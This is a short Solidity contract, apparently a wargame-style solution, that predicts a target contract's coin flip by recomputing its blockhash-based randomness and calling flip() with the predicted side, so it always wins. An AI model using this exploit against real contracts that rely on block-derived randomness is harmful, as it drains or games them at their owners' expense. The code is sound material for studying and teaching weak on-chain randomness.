// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ICoinFlipTarget {
    function flip(bool guess) external returns (bool);
}

contract CoinFlip {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event Guess(bool guess, uint256 blockNumber);

    function guessFlip(address targetAddress) external returns (bool) {
        ICoinFlipTarget target = ICoinFlipTarget(targetAddress);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = target.flip(side);
        emit Guess(result, block.number);
        return result;
    }
}
